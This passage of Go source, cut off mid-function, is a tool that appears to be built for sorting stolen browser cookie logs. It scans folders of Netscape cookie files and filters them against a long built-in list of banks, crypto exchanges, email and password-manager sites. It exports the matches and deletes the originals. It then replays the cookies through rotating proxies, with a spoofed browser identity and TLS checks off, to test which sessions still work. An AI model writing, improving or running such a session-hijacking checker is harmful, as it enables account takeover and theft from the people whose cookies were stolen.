package main

import (
	"bufio"
	"context"
	"crypto/tls"
	"embed"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"io/fs"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"runtime"
	"sort"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

const MaxCookieFileSize = 256 * 1024 * 1024

const Version = "1.6.0"

//go:embed static/*
var staticFiles embed.FS

type Config struct {
	Filters   []string `json:"filters"`
	LastRun   string   `json:"last_run"`
	ProxyMode string   `json:"proxy_mode"`
	ProxyFile string   `json:"proxy_file"`
}

type Cookie struct {
	Domain    string `json:"-"`
	RawDomain string `json:"-"`
	Flag      string `json:"-"`
	Path      string `json:"-"`
	Secure    string `json:"-"`
	Expiry    string `json:"-"`
	Name      string `json:"-"`
	Value     string `json:"-"`
}

type Summary struct {
	RunID           string         `json:"run_id"`
	Timestamp       string         `json:"timestamp"`
	FilesScanned    int            `json:"files_scanned"`
	TotalCookies    int            `json:"total_cookies"`
	TotalHits       int            `json:"total_hits"`
	CheckedCookies  int            `json:"checked_cookies"`
	ValidCookies    int            `json:"valid_cookies"`
	InvalidCookies  int            `json:"invalid_cookies"`
	Errors          int            `json:"errors"`
	ElapsedSeconds  float64        `json:"elapsed_seconds"`
	FiltersUsed     []string       `json:"filters_used"`
	SourceDirectory string         `json:"source_directory"`
	DomainBreakdown map[string]int `json:"domain_breakdown"`
	OutputDir       string         `json:"output_dir"`
	ProfilesDir     string         `json:"profiles_dir"`
}

type RunEntry struct {
	RunID          string  `json:"run_id"`
	Timestamp      string  `json:"timestamp"`
	FilesScanned   int     `json:"files_scanned"`
	TotalCookies   int     `json:"total_cookies"`
	TotalHits      int     `json:"total_hits"`
	Errors         int     `json:"errors"`
	ElapsedSeconds float64 `json:"elapsed_seconds"`
}

type ProgressEvent struct {
	Type            string         `json:"type"`
	Processed       int            `json:"processed,omitempty"`
	Total           int            `json:"total,omitempty"`
	Hits            int            `json:"hits,omitempty"`
	Percent         float64        `json:"percent,omitempty"`
	RunID           string         `json:"run_id,omitempty"`
	FilesScanned    int            `json:"files_scanned,omitempty"`
	TotalCookies    int            `json:"total_cookies,omitempty"`
	TotalHits       int            `json:"total_hits,omitempty"`
	Errors          int            `json:"errors,omitempty"`
	ElapsedSeconds  float64        `json:"elapsed_seconds,omitempty"`
	OutputDir       string         `json:"output_dir,omitempty"`
	DomainBreakdown map[string]int `json:"domain_breakdown,omitempty"`
	Message         string         `json:"message,omitempty"`
	Checked         int            `json:"checked,omitempty"`
	CheckTotal      int            `json:"check_total,omitempty"`
	Valid           int            `json:"valid,omitempty"`
	Invalid         int            `json:"invalid,omitempty"`
	CheckStatus     string         `json:"check_status,omitempty"`
}

type checkTask struct {
	domain  string
	cookies []Cookie
}

var (
	cfg           *Config
	cfgMu         sync.RWMutex
	cfgPath       string
	resDir        string
	profilesDir   string
	assetsDir     string
	changelogPath string
	proxies       []string
	proxiesMu     sync.Mutex
	proxiesPath   string
	logPath       string
	logMu         sync.Mutex

	sharedTransport = &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		MaxIdleConns:    100,
		IdleConnTimeout: 30 * time.Second,
	}
)

func safeSSE(w http.ResponseWriter, flusher http.Flusher, ev ProgressEvent) {
	defer func() { recover() }()
	fmt.Fprintf(w, "data: %s\n\n", mustJSON(ev))
	if flusher != nil {
		flusher.Flush()
	}
}

func safeSSEWithContext(ctx context.Context, w http.ResponseWriter, flusher http.Flusher, ev ProgressEvent) {
	select {
	case <-ctx.Done():
		return
	default:
	}
	safeSSE(w, flusher, ev)
}

func getExeDir() string {
	exe, err := os.Executable()
	if err != nil {
		d, _ := os.Getwd()
		return d
	}
	return filepath.Dir(exe)
}

func initPaths() {
	base := getExeDir()
	cfgPath = filepath.Join(base, "retard_config.json")
	resDir = filepath.Join(base, "results")
	assetsDir = filepath.Join(base, "assets")
	changelogPath = filepath.Join(base, "CHANGELOG.md")
	logPath = filepath.Join(base, "retard-sorter.log")
	proxiesPath = filepath.Join(base, "proxies.txt")

	home, _ := os.UserHomeDir()
	if home == "" {
		home = base
	}
	profilesDir = filepath.Join(home, "Documents", "profiles")

	os.MkdirAll(resDir, 0755)
	os.MkdirAll(assetsDir, 0755)
	os.MkdirAll(profilesDir, 0755)

	if _, err := os.Stat(logPath); os.IsNotExist(err) {
		f, ferr := os.Create(logPath)
		if ferr == nil {
			f.Close()
		}
	}

	if _, err := os.Stat(proxiesPath); os.IsNotExist(err) {
		defaultProxies := "# Retard Sorter - proxy list (one per line)\n" +
			"# Format: ip:port or ip:port:user:pass\n" +
			"# Example:\n" +
			"# 127.0.0.1:8080\n" +
			"# 1.2.3.4:1080:user:pass\n"
		os.WriteFile(proxiesPath, []byte(defaultProxies), 0644)
	}
}

func appLog(format string, args ...interface{}) {
	logMu.Lock()
	defer logMu.Unlock()
	msg := fmt.Sprintf(format, args...)
	line := fmt.Sprintf("[%s] %s\n", time.Now().Format("2006-01-02 15:04:05"), msg)
	f, err := os.OpenFile(logPath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err == nil {
		f.WriteString(line)
		f.Close()
	}
	fmt.Print(line)
}

func loadConfig() *Config {
	initPaths()
	data, err := os.ReadFile(cfgPath)
	if err == nil {
		var c Config
		if json.Unmarshal(data, &c) == nil {
			if c.Filters == nil {
				c.Filters = []string{}
			}
			return &c
		}
	}
	c := &Config{
		Filters: make([]string, len(DefaultFilters)),
	}
	copy(c.Filters, DefaultFilters)
	saveConfig(c)
	return c
}

func saveConfig(c *Config) {
	data, _ := json.MarshalIndent(c, "", "  ")
	os.WriteFile(cfgPath, data, 0644)
}

var DefaultFilters = []string{
	"login.live.com", "login.microsoftonline.com", "login.microsoft.com",
	"account.live.com", "outlook.live.com", "mail.google.com",
	"accounts.google.com", "facebook.com", "instagram.com", "twitter.com",
	"x.com", "tiktok.com", "reddit.com", "discord.com", "discordapp.com",
	"netflix.com", "spotify.com", "amazon.com", "paypal.com", "ebay.com",
	"shopify.com", "etsy.com", "walmart.com", "target.com", "bestbuy.com",
	"homedepot.com", "lowes.com", "costco.com", "kroger.com",
	"albertsons.com", "cvs.com", "walgreens.com", "bankofamerica.com",
	"wellsfargo.com", "chase.com", "capitalone.com", "americanexpress.com",
	"discover.com", "citibank.com", "usbank.com", "pnc.com", "tdbank.com",
	"santander.com", "hsbc.com", "barclays.com", "lloydsbank.com",
	"natwest.com", "rbs.co.uk", "halifax.co.uk", "nationwide.co.uk",
	"co-operativebank.co.uk", "tsb.co.uk", "virginmoney.com",
	"yorkshirebank.co.uk", "clydesdalebank.com", "alliedirishbanks.com",
	"boi.ie", "permanenttsb.ie", "kbc.ie", "ulsterbank.ie", "anz.com",
	"westpac.com.au", "commonwealthbank.com.au", "nab.com.au", "ing.com.au",
	"amp.com.au", "bendigobank.com.au", "adelaidebank.com.au",
	"bankwest.com.au", "stgeorge.com.au", "suncorp.com.au", "meaa.com.au",
	"ubo.com.au", "86400.com.au", "upt.com.au", "judo.bank", "tyro.com",
	"prospa.com", "moula.com", "capify.com", "ondeck.com.au",
	"cashstop.com.au", "nimble.com.au", "walnut.com.au", "savvy.com.au",
	"plenti.com.au", "rateSetter.com.au", "moneyplace.com.au",
	"firstmac.com.au", "resimac.com.au", "pepper.com.au", "liberty.com.au",
	"homestar.com.au", "loans.com.au", "aussie.com.au",
	"mortgagechoice.com.au", "homeloans.com.au",
	"statecustodians.com.au", "tmbank.com.au", "mybo.com.au",
	"ubank.com.au", "86 400.com.au", "xinja.com.au", "voltbank.com.au",
	"neobank.com.au", "wewill.gov.au", "webull.com", "robinhood.com",
	"coinbase.com", "binance.com", "kraken.com", "gemini.com",
	"crypto.com", "blockchain.com", "bitfinex.com", "bittrex.com",
	"poloniex.com", "hitbtc.com", "huobi.com", "okex.com", "bybit.com",
	"ftx.com", "kucoin.com", "gate.io", "mexc.com", "lbank.com",
	"zb.com", "coinex.com", "bitmart.com", "ascendex.com", "hotbit.io",
	"bitget.com", "bingx.com", "woo.network", "phemex.com", "deribit.com",
	"bitmex.com", "delta.exchange", "aax.com", "btse.com", "liquid.com",
	"quoinex.com", "coinflex.com", "bit.com", "digifinex.com",
	"latoken.com", "kuna.io", "whitebit.com", "coinmetro.com", "coss.io",
	"idex.io", "uniswap.org", "pancakeswap.finance", "sushiswap.com",
	"curve.fi", "balancer.fi", "yearn.finance", "compound.finance",
	"aave.com", "makerdao.com", "instadapp.io", "zapper.fi", "zerion.io",
	"debank.com", "opensea.io", "rarible.com", "superrare.com",
	"knownorigin.io", "mintable.app", "niftygateway.com",
	"foundation.app", "async.art", "makersplace.com", "veve.me",
	"godsunchained.com", "axieinfinity.com", "thesandboxgame.com",
	"decentraland.org", "sorare.com", "nba-topshot.com",
	"coinmarketcap.com", "coingecko.com", "tradingview.com",
	"investing.com", "bloomberg.com", "reuters.com", "cnbc.com",
	"wsj.com", "ft.com", "economist.com", "nytimes.com",
	"washingtonpost.com", "theguardian.com", "bbc.com", "bbc.co.uk",
	"msn.com", "yahoo.com", "aol.com", "protonmail.com", "proton.me",
	"tutanota.com", "gmx.com", "mail.com", "yandex.com", "zoho.com",
	"fastmail.com", "icloud.com", "me.com", "mac.com", "github.com",
	"gitlab.com", "bitbucket.org", "atlassian.com", "jira.com",
	"confluence.com", "slack.com", "teams.microsoft.com", "zoom.us",
	"webex.com", "gotomeeting.com", "teamviewer.com", "anydesk.com",
	"logmein.com", "vnc.com", "lastpass.com", "1password.com",
	"dashlane.com", "bitwarden.com", "keeper.com", "nordpass.com",
	"roboform.com", "enpass.io", "truekey.com", "mcafee.com",
	"norton.com", "avast.com", "avg.com", "bitdefender.com",
	"kaspersky.com", "malwarebytes.com", "eset.com", "trendmicro.com",
	"sophos.com", "panda.com", "comodo.com", "zonealarm.com",
	"checkpoint.com", "paloaltonetworks.com", "fortinet.com", "cisco.com",
	"juniper.com", "sonicwall.com", "watchguard.com", "barracuda.com",
	"proofpoint.com", "mimecast.com", "symantec.com", "broadcom.com",
	"vmware.com", "oracle.com", "sap.com", "salesforce.com",
	"servicenow.com", "workday.com", "adp.com", "paychex.com",
	"intuit.com", "quickbooks.com", "xero.com", "myob.com",
	"freshbooks.com", "waveapps.com", "hubspot.com", "mailchimp.com",
	"constantcontact.com", "activecampaign.com", "getresponse.com",
	"convertkit.com", "aweber.com", "infusionsoft.com", "ontraport.com",
	"keap.com", "drip.com", "sendinblue.com", "sendgrid.com",
	"twilio.com", "plivo.com", "nexmo.com", "messagebird.com",
	"sinch.com", "bandwidth.com", "flowroute.com", "telnyx.com",
	"voxbone.com", "inteliquent.com", "peering.com", "equinix.com",
	"digitalrealty.com", "cyrusone.com", "qtsdatacenters.com",
	"ironmountain.com", "atandt.com", "verizon.com", "tmobile.com",
	"sprint.com", "cingular.com",
}

func parseNetscapeCookieFile(path string) ([]Cookie, error) {
	info, err := os.Stat(path)
	if err != nil {
		return nil, err
	}
	if info.Size() > MaxCookieFileSize {
		return nil, fmt.Errorf("file too large: %d bytes (max %d)", info.Size(), MaxCookieFileSize)
	}
	if info.Size() == 0 {
		return nil, nil
	}
	f, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer f.Close()

	cookies := make([]Cookie, 0, 64)
	scanner := bufio.NewScanner(f)
	scanner.Buffer(make([]byte, 256*1024), 10*1024*1024)

	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" || strings.HasPrefix(line, "#") || strings.HasPrefix(line, "//") {
			continue
		}
		parts := strings.Split(line, "\t")
		if len(parts) >= 7 {
			cookies = append(cookies, Cookie{
				RawDomain: parts[0],
				Domain:    strings.TrimLeft(parts[0], "."),
				Flag:      parts[1],
				Path:      parts[2],
				Secure:    parts[3],
				Expiry:    parts[4],
				Name:      parts[5],
				Value:     strings.Join(parts[6:], "\t"),
			})
		}
	}
	if err := scanner.Err(); err != nil {
		return cookies, fmt.Errorf("scan error: %w", err)
	}
	return cookies, nil
}

// filterIndex provides O(1) exact-match lookups and fast suffix fallback.
type filterIndex struct {
	exact   map[string]string // lowercase -> original
	suffixes []string         // pre-computed lowercase for suffix matching
}

func buildFilterIndex(filters []string) *filterIndex {
	fi := &filterIndex{
		exact:    make(map[string]string, len(filters)),
		suffixes: make([]string, 0, len(filters)),
	}
	for _, f := range filters {
		low := strings.ToLower(f)
		fi.exact[low] = f
		fi.suffixes = append(fi.suffixes, low)
	}
	return fi
}

func (fi *filterIndex) match(c Cookie) string {
	cd := strings.ToLower(c.Domain)
	// O(1) exact match
	if orig, ok := fi.exact[cd]; ok {
		return orig
	}
	// Suffix match
	for _, tdl := range fi.suffixes {
		if strings.HasSuffix(cd, "."+tdl) {
			return fi.exact[tdl]
		}
	}
	// Also check raw domain
	raw := strings.ToLower(strings.TrimLeft(c.RawDomain, "."))
	if raw != cd {
		if orig, ok := fi.exact[raw]; ok {
			return orig
		}
		for _, tdl := range fi.suffixes {
			if strings.HasSuffix(raw, "."+tdl) {
				return fi.exact[tdl]
			}
		}
	}
	return ""
}

// === PROXY ===

func loadProxies(path string) error {
	data, err := os.ReadFile(path)
	if err != nil {
		return err
	}
	lines := strings.Split(strings.TrimSpace(string(data)), "\n")
	proxiesMu.Lock()
	proxies = nil
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		proxies = append(proxies, line)
	}
	proxiesMu.Unlock()
	return nil
}

func buildProxyURL(raw, mode string) string {
	parts := strings.Split(raw, ":")
	if len(parts) < 2 {
		return ""
	}
	ip, port := parts[0], parts[1]
	switch {
	case len(parts) >= 4:
		user, pass := parts[2], parts[3]
		return fmt.Sprintf("%s://%s:%s@%s:%s", mode, user, pass, ip, port)
	case strings.Contains(mode, "socks"):
		return fmt.Sprintf("socks5://%s:%s", ip, port)
	default:
		return fmt.Sprintf("http://%s:%s", ip, port)
	}
}

func checkDomainCookies(ctx context.Context, domain string, cookies []Cookie, proxyURL string) bool {
	if domain == "" {
		return false
	}
	u := "https://" + domain + "/"
	req, err := http.NewRequestWithContext(ctx, "GET", u, nil)
	if err != nil {
		return false
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
	req.Header.Set("Accept-Language", "en-US,en;q=0.5")
	for _, c := range cookies {
		if c.Name == "" {
			continue
		}
		req.AddCookie(&http.Cookie{
			Name:   c.Name,
			Value:  c.Value,
			Domain: c.Domain,
			Path:   c.Path,
		})
	}

	tr := sharedTransport
	if proxyURL != "" {
		p, e := url.Parse(proxyURL)
		if e != nil {
			return false
		}
		perReqTr := &http.Transport{
			Proxy:                 http.ProxyURL(p),
			TLSClientConfig:       &tls.Config{InsecureSkipVerify: true},
			MaxIdleConns:          10,
			MaxIdleConnsPerHost:   2,
			IdleConnTimeout:       30 * time.Second,
			ResponseHeaderTimeout: 10 * time.Second,
			ExpectContinueTimeout: 1 * time.Second,
		}
		defer perReqTr.CloseIdleConnections()
		tr = perReqTr
	}

	client := &http.Client{
		Transport: tr,
		Timeout:   15 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			if len(via) >= 3 {
				return errors.New("too many redirects")
			}
			return nil
		},
	}
	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	defer func() {
		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()
	}()
	return resp.StatusCode == 200
}

// === HTTP HANDLERS ===

func handleChangelog(w http.ResponseWriter, r *http.Request) {
	data, err := os.ReadFile(changelogPath)
	if err != nil {
		http.Error(w, "changelog not found", 404)
		return
	}
	writeJSON(w, map[string]string{"content": string(data)})
}

func handleConfig(w http.ResponseWriter, r *http.Request) {
	cfgMu.RLock()
	c := *cfg
	cfgMu.RUnlock()
	writeJSON(w, c)
}

func handleUpdateFilters(w http.ResponseWriter, r *http.Request) {
	var req struct {
		Filters []string `json:"filters"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "invalid JSON", 400)
		return
	}
	cfgMu.Lock()
	cfg.Filters = req.Filters
	sort.Strings(cfg.Filters)
	saveConfig(cfg)
	cfgMu.Unlock()
	writeJSON(w, map[string]string{"status": "ok"})
}

func handleRuns(w http.ResponseWriter, r *http.Request) {
	os.MkdirAll(resDir, 0755)
	entries, err := os.ReadDir(resDir)
	if err != nil {
		writeJSON(w, []RunEntry{})
		return
	}
	var runs []RunEntry
	for _, e := range entries {
		if !e.IsDir() || !strings.HasPrefix(e.Name(), "run_") {
			continue
		}
		sumPath := filepath.Join(resDir, e.Name(), "summary.json")
		data, err := os.ReadFile(sumPath)
		if err != nil {
			continue
		}
		var s Summary
		if json.Unmarshal(data, &s) != nil {
			continue
		}
		runs = append(runs, RunEntry{
			RunID:          s.RunID,
			Timestamp:      s.Timestamp,
			FilesScanned:   s.FilesScanned,
			TotalCookies:   s.TotalCookies,
			TotalHits:      s.TotalHits,
			Errors:         s.Errors,
			ElapsedSeconds: s.ElapsedSeconds,
		})
	}

	profilesEntries, err := os.ReadDir(profilesDir)
	if err == nil {
		for _, e := range profilesEntries {
			if !e.IsDir() || !strings.HasPrefix(e.Name(), "run_") {
				continue
			}
			sumPath := filepath.Join(profilesDir, e.Name(), "summary.json")
			data, err := os.ReadFile(sumPath)
			if err != nil {
				continue
			}
			var s Summary
			if json.Unmarshal(data, &s) != nil {
				continue
			}
			runs = append(runs, RunEntry{
				RunID:          s.RunID,
				Timestamp:      s.Timestamp,
				FilesScanned:   s.FilesScanned,
				TotalCookies:   s.TotalCookies,
				TotalHits:      s.TotalHits,
				Errors:         s.Errors,
				ElapsedSeconds: s.ElapsedSeconds,
			})
		}
	}

	sort.Slice(runs, func(i, j int) bool {
		return runs[i].RunID > runs[j].RunID
	})
	writeJSON(w, runs)
}

func handleRunDetail(w http.ResponseWriter, r *http.Request, runID string) {
	paths := []string{filepath.Join(resDir, "run_"+runID, "summary.json"), filepath.Join(profilesDir, "run_"+runID, "summary.json")}
	for _, sumPath := range paths {
		data, err := os.ReadFile(sumPath)
		if err != nil {
			continue
		}
		var s Summary
		if json.Unmarshal(data, &s) != nil {
			continue
		}
		writeJSON(w, s)
		return
	}
	http.Error(w, "not found", 404)
}

func processFileLoop(ctx context.Context, w http.ResponseWriter, flusher http.Flusher, filters []string, dir, hitsDir, timestamp, proxyMode, proxyFile string) (Summary, bool) {
	now := time.Now()
	fi := buildFilterIndex(filters)
	useProxy := proxyMode == "http" || proxyMode == "socks4" || proxyMode == "socks5"

	var files []string
	filepath.WalkDir(dir, func(path string, d os.DirEntry, err error) error {
		if err != nil || d.IsDir() {
			return nil
		}
		files = append(files, path)
		return nil
	})
	sort.Strings(files)

	totalFiles := len(files)
	if totalFiles == 0 {
		return Summary{}, false
	}

	var totalCookies int64
	var totalHits int64
	var errorCount int64
	var domainHitsMu sync.Mutex
	domainHits := make(map[string]int)
	startTime := time.Now()

	type fileHitsInfo struct {
		relPath string
		domains map[string][]Cookie
	}
	var allFileHitsMu sync.Mutex
	var allFileHits []fileHitsInfo

	// Track parent dirs for deferred cleanup
	var dirsToCleanMu sync.Mutex
	dirsToClean := make(map[string]struct{})

	writeHitsFile := func(relPath string, fileHits []Cookie, idx int) bool {
		if len(fileHits) == 0 {
			return true
		}
		flatName := strings.ReplaceAll(relPath, " ", "_")
		flatName = strings.ReplaceAll(flatName, "/", "_")
		flatName = strings.ReplaceAll(flatName, "\\", "_")
		if flatName == "." || flatName == "" {
			flatName = fmt.Sprintf("file_%d", idx)
		}
		outPath := filepath.Join(hitsDir, flatName)
		var sb strings.Builder
		sb.Grow(len(fileHits) * 128)
		sb.WriteString("# Netscape HTTP Cookie File\n")
		sb.WriteString(fmt.Sprintf("# Source: %s\n", relPath))
		sb.WriteString(fmt.Sprintf("# Matched domains: %d cookies\n", len(fileHits)))
		sb.WriteString(fmt.Sprintf("# Exported at: %s\n\n", now.Format(time.RFC3339)))
		for _, c := range fileHits {
			sb.WriteString(fmt.Sprintf("%s\t%s\t%s\t%s\t%s\t%s\t%s\n",
				c.RawDomain, c.Flag, c.Path, c.Secure, c.Expiry, c.Name, c.Value))
		}
		if err := os.WriteFile(outPath, []byte(sb.String()), 0644); err != nil {
			appLog("WARN - failed to write hits file %s: %v", outPath, err)
			return false
		}
		return true
	}

	processOne := func(idx int, filePath string) (fileErr error) {
		defer func() {
			if rec := recover(); rec != nil {
				appLog("PANIC processing file %s: %v", filePath, rec)
				fileErr = fmt.Errorf("panic: %v", rec)
			}
		}()

		relPath, _ := filepath.Rel(dir, filePath)
		cookies, err := parseNetscapeCookieFile(filePath)
		if err != nil {
			return err
		}
		if len(cookies) == 0 {
			os.Remove(filePath)
			return nil
		}
		atomic.AddInt64(&totalCookies, int64(len(cookies)))

		var fileHits []Cookie
		var domains map[string][]Cookie
		if useProxy {
			domains = make(map[string][]Cookie)
		}
		for _, c := range cookies {
			matchedDomain := fi.match(c)
			if matchedDomain != "" {
				fileHits = append(fileHits, c)
				if useProxy {
					domains[matchedDomain] = append(domains[matchedDomain], c)
				}
				domainHitsMu.Lock()
				domainHits[matchedDomain]++
				domainHitsMu.Unlock()
				atomic.AddInt64(&totalHits, 1)
			}
		}

		if len(fileHits) > 0 {
			writeHitsFile(relPath, fileHits, idx)
			if useProxy {
				allFileHitsMu.Lock()
				allFileHits = append(allFileHits, fileHitsInfo{relPath, domains})
				allFileHitsMu.Unlock()
			}
		}

		os.Remove(filePath)

		// Track parent dir for deferred cleanup
		parent := filepath.Dir(filePath)
		if parent != dir && parent != "." && parent != "/" {
			dirsToCleanMu.Lock()
			dirsToClean[parent] = struct{}{}
			dirsToCleanMu.Unlock()
		}
		return nil
	}

	// Parallel file processing
	const numWorkers = 16
	fileCh := make(chan int, numWorkers*4)
	var wg sync.WaitGroup
	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			defer func() { recover() }()
			for idx := range fileCh {
				select {
				case <-ctx.Done():
					return
				default:
				}
				if err := processOne(idx, files[idx]); err != nil {
					atomic.AddInt64(&errorCount, 1)
					appLog("ERROR processing %s: %v", files[idx], err)
				}
			}
		}()
	}

	// Feed files and send throttled progress
	for idx := range files {
		select {
		case <-ctx.Done():
			break
		case fileCh <- idx:
		}
		if (idx+1)%10 == 0 || idx+1 == totalFiles {
			hits := int(atomic.LoadInt64(&totalHits))
			safeSSEWithContext(ctx, w, flusher, ProgressEvent{
				Type: "progress", Processed: idx + 1, Total: totalFiles,
				Hits: hits, Percent: float64(idx+1) / float64(totalFiles) * 100,
			})
		}
		if (idx+1)%1000 == 0 || idx+1 == totalFiles {
			hits := int(atomic.LoadInt64(&totalHits))
			errs := int(atomic.LoadInt64(&errorCount))
			appLog("RUN PROGRESS - %d/%d files, %d hits, %d errors", idx+1, totalFiles, hits, errs)
		}
	}
	close(fileCh)
	wg.Wait()

	// Deferred directory cleanup
	for d := range dirsToClean {
		for d != dir && d != "." && d != "/" {
			entries, err := os.ReadDir(d)
			if err != nil || len(entries) > 0 {
				break
			}
			if err := os.Remove(d); err != nil {
				break
			}
			d = filepath.Dir(d)
		}
	}

	finalHits := int(atomic.LoadInt64(&totalHits))
	finalCookies := int(atomic.LoadInt64(&totalCookies))
	finalErrors := int(atomic.LoadInt64(&errorCount))

	checked := 0
	valid := 0
	invalid := 0

	if useProxy && len(allFileHits) > 0 {
		var tasks []checkTask
		for _, fh := range allFileHits {
			for domain, cookies := range fh.domains {
				tasks = append(tasks, checkTask{domain, cookies})
			}
		}
		totalChecks := len(tasks)
		if totalChecks > 0 {
			runProxyChecks(ctx, w, flusher, tasks, totalFiles, finalHits, &checked, &valid, &invalid, proxyMode, proxyFile)
		}
	}

	elapsed := time.Since(startTime).Seconds()
	return Summary{
		RunID:           timestamp,
		Timestamp:       now.Format(time.RFC3339),
		FilesScanned:    totalFiles,
		TotalCookies:    finalCookies,
		TotalHits:       finalHits,
		CheckedCookies:  checked,
		ValidCookies:    valid,
		InvalidCookies:  invalid,
		Errors:          finalErrors,
		ElapsedSeconds:  elapsed,
		FiltersUsed:     filters,
		SourceDirectory: dir,
		DomainBreakdown: domainHits,
		OutputDir:       filepath.Join(resDir, "run_"+timestamp),
		ProfilesDir:     profilesDir,
	}, true
}

func runProxyChecks(ctx context.Context, w http.ResponseWriter, flusher http.Flusher, tasks []checkTask, totalFiles, totalHits int, checkedOut, validOut, invalidOut *int, proxyMode, proxyFile string) {
	totalChecks := len(tasks)

	safeSSEWithContext(ctx, w, flusher, ProgressEvent{
		Type: "progress", Processed: totalFiles, Total: totalFiles,
		Hits: totalHits, Percent: 100, Checked: 0, CheckTotal: totalChecks, CheckStatus: "loading proxies",
	})

	if proxyFile != "" {
		if err := loadProxies(proxyFile); err != nil {
			safeSSEWithContext(ctx, w, flusher, ProgressEvent{
				Type: "progress", Processed: totalFiles, Total: totalFiles,
				Hits: totalHits, Percent: 100, Checked: 0, CheckTotal: totalChecks, CheckStatus: "proxy load failed: " + err.Error(),
			})
		}
	}

	var completed int64
	var valids int64
	progressDone := make(chan struct{})
	var progressCloseOnce sync.Once

	var progressWG sync.WaitGroup
	progressWG.Add(1)
	go func() {
		defer progressWG.Done()
		defer func() { recover() }()
		ticker := time.NewTicker(200 * time.Millisecond)
		defer ticker.Stop()
		for {
			select {
			case <-progressDone:
				return
			case <-ticker.C:
				if ctx.Err() != nil {
					return
				}
				c := atomic.LoadInt64(&completed)
				if c == 0 {
					continue
				}
				v := atomic.LoadInt64(&valids)
				pct := float64(0)
				if totalChecks > 0 {
					pct = float64(c) / float64(totalChecks) * 100
				}
				safeSSEWithContext(ctx, w, flusher, ProgressEvent{
					Type: "progress", Processed: totalFiles, Total: totalFiles,
					Hits: totalHits, Percent: pct,
					Checked: int(c), CheckTotal: totalChecks,
					Valid: int(v), Invalid: int(c - v),
					CheckStatus: fmt.Sprintf("checking %d/%d", c, totalChecks),
				})
			case <-ctx.Done():
				return
			}
		}
	}()

	const numWorkers = 20
	taskCh := make(chan checkTask, numWorkers*2)
	var wg sync.WaitGroup

	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			defer func() { recover() }()
			for {
				select {
				case <-ctx.Done():
					return
				case task, ok := <-taskCh:
					if !ok {
						return
					}
					var pu string
					proxiesMu.Lock()
					if len(proxies) > 0 {
						pu = buildProxyURL(proxies[rand.Intn(len(proxies))], proxyMode)
					}
					proxiesMu.Unlock()

					if checkDomainCookies(ctx, task.domain, task.cookies, pu) {
						atomic.AddInt64(&valids, 1)
					}
					atomic.AddInt64(&completed, 1)
				}
			}
		}()
	}

feedLoop:
	for _, task := range tasks {
		select {
		case <-ctx.Done():
			break feedLoop
		case taskCh <- task:
		}
	}
	close(taskCh)

	doneCh := make(chan struct{})
	go func() {
		wg.Wait()
		close(doneCh)
	}()

	select {
	case <-doneCh:
	case <-ctx.Done():
	}

	progressCloseOnce.Do(func() { close(progressDone) })
	progressWG.Wait()

	c := atomic.LoadInt64(&completed)
	v := atomic.LoadInt64(&valids)
	*checkedOut = int(c)
	*validOut = int(v)
	*invalidOut = int(c - v)
}

func hasCookieSubdirs(root string) bool {
	entries, err := os.ReadDir(root)
	if err != nil {
		return false
	}
	for _, e := range entries {
		if e.IsDir() {
			cookieDir := filepath.Join(root, e.Name(), "cookie")
			if info, err := os.Stat(cookieDir); err == nil && info.IsDir() {
				if items, _ := os.ReadDir(cookieDir); len(items) > 0 {
					return true
				}
			}
		}
	}
	return false
}

func collectCookieFiles(srcDir, tmpDir string) (int, error) {
	os.MkdirAll(tmpDir, 0755)
	count := 0
	filepath.WalkDir(srcDir, func(path string, d os.DirEntry, err error) error {
		if err != nil || d.IsDir() {
			return nil
		}
		parent := filepath.Dir(path)
		if strings.EqualFold(filepath.Base(parent), "cookie") {
			ext := strings.ToLower(filepath.Ext(path))
			if ext == ".txt" || ext == "" {
				info, ierr := os.Stat(path)
				if ierr != nil {
					return nil
				}
				if info.Size() > MaxCookieFileSize {
					appLog("SKIP - file too large (%d bytes): %s", info.Size(), path)
					return nil
				}
				data, rerr := os.ReadFile(path)
				if rerr == nil {
					name := fmt.Sprintf("%d_%s", count, d.Name())
					dst := filepath.Join(tmpDir, name)
					os.WriteFile(dst, data, 0644)
					count++
				}
			}
		}
		return nil
	})
	return count, nil
}

func handleRunProgress(w http.ResponseWriter, r *http.Request) {
	defer func() {
		if rec := recover(); rec != nil {
			appLog("PANIC in handleRunProgress: %v", rec)
			writeSSE(w, ProgressEvent{Type: "error", Message: fmt.Sprintf("internal error: %v", rec)})
		}
	}()

	dir := r.URL.Query().Get("dir")
	if dir == "" {
		http.Error(w, "missing dir parameter", 400)
		return
	}

	cfgMu.RLock()
	filters := make([]string, len(cfg.Filters))
	copy(filters, cfg.Filters)
	proxyMode := cfg.ProxyMode
	proxyFile := cfg.ProxyFile
	cfgMu.RUnlock()

	if len(filters) == 0 {
		writeSSE(w, ProgressEvent{Type: "error", Message: "no filters configured"})
		return
	}

	info, err := os.Stat(dir)
	if err != nil || !info.IsDir() {
		writeSSE(w, ProgressEvent{Type: "error", Message: "invalid directory"})
		return
	}

	appLog("RUN START - directory: %s, filters: %d", dir, len(filters))

	w.Header().Set("Content-Type", "text/event-stream")
	w.Header().Set("Cache-Control", "no-cache")
	w.Header().Set("Connection", "keep-alive")
	flusher, _ := w.(http.Flusher)

	now := time.Now()
	timestamp := now.Format("20060102_150405")

	profilesRunDir := filepath.Join(profilesDir, "run_"+timestamp)
	tmpDir := filepath.Join(profilesRunDir, "tmp")
